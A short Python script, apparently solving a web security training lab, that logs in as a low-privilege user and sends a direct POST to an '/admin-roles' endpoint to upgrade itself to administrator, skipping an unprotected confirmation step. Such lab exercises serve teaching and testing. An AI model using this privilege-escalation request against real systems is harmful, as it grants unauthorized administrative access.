#!/usr/bin/env python3
"""Multi-step process with no access control on one step"""

from lab_11 import Lab


def main() -> None:
    """Entry point"""
    site = Lab()
    site.login(username="wiener", password="peter")
    payload = {"action": "upgrade", "confirmed": "true", "username": "wiener"}
    site.session.post(site.url + "/admin-roles", data=payload)


if __name__ == "__main__":
    main()
